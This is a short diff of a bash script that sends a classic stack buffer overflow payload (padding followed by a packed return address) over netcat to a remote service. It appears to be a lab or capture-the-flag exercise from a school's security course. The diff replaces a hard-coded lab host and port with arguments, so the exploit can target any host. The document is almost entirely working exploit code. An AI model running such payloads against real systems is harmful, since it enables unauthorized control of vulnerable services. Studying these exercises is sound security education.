@@ -1,3 +1,6 @@
 #!/bin/bash
 
-python2 -c 'print "A" * 64 + "B" * 12 + "\x7b\x85\x04\x08"' | nc lse.epita.fr 52133
+HOST=$1
+PORT=$2
+
+python2 -c 'print "A" * 64 + "B" * 12 + "\x7b\x85\x04\x08"' | nc "$HOST" "$PORT"
